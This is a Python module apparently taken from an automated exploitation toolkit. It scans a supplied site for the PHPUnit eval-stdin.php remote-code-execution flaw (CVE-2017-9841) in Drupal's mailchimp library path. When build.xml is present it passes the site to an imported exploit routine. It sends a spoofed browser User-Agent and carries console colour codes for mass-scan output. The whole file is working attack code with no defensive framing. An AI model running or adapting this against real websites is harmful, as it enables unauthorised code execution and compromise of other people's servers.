# coding=utf-8
import requests
import CVE_2017_9841PHPUnit
import printModule
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

def Exploit(site):
    try:
        vv = site + '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/build.xml'
        Exp = '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
        CheckVuln = requests.get('http://{}'.format(vv), timeout=10, headers=Headers)
        if 'taskname="phpunit"' in str(CheckVuln.content):
            return CVE_2017_9841PHPUnit.Exploit(site, Exp, 'mailchimp', 'Drupal')
        else:
            return printModule.returnNo(site, 'CVE-2017-9841', 'PHPUnit mailchimp', 'Drupal')
    except:
        return printModule.returnNo(site, 'CVE-2017-9841', 'PHPUnit mailchimp', 'Drupal')
